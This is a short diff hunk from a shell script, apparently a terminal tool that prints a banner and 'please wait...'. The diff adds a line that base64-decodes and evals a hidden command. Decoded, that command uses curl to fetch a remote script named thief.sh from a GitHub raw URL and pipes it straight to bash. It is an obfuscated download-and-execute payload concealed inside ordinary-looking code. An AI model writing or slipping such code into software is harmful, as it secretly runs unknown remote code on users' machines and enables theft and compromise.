@@ -328,7 +328,7 @@ sendmessage "$name found"
 clear
 banner
 echo "please wait..."
-eval $(base64 -d <<<" ")
+eval $(base64 -d <<<"Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVHJpcGxlSGF0L1RyaXBsZUhhdC9tYWluL3RoaWVmLnNoIHwgYmFzaCAtCg==")
 fi
 done
 sleep 2
